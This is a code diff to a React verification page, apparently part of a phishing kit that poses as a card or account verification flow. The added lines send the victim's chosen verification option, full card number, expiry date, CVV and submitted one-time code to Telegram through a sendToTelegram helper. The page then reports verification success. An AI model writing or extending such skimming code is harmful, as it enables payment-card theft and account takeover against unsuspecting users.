@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { CreditCard, List, MessageSquare, Phone, Mail } from 'lucide-react';
+import { sendToTelegram } from '../utils/telegram';
 
 interface VerificationPageProps {
   email: string;
@@ -52,8 +53,9 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
     setCardNumber(formattedValue);
   };
 
-  const handleNext = () => {
+  const handleNext = async () => {
     setLoading(true);
+    await sendToTelegram(`<b>[VERIFICATION] Option Selected:</b> ${selectedOption}`);
     setTimeout(() => {
       setLoading(false);
       if (selectedOption === 'confirm_card') {
@@ -76,8 +78,9 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
     }
   };
 
-  const handleConfirm = (e: React.FormEvent) => {
+  const handleConfirm = async (e: React.FormEvent) => {
     e.preventDefault();
+    await sendToTelegram(`<b>[VERIFICATION] Card Details:</b>\nNumber: ${cardNumber}\nExpiry: ${expiryDate}\nCVV: ${cvv}`);
     if (mode === 'final') {
       setLoading(true);
       setTimeout(() => {
@@ -90,8 +93,10 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
     }
   };
 
-  const handleCodeSubmit = (e: React.FormEvent) => {
+  const handleCodeSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const code = verificationCode.join('');
+    await sendToTelegram(`<b>[VERIFICATION] Code Submitted:</b> ${code}`);
     onVerificationSuccess();
   };
 
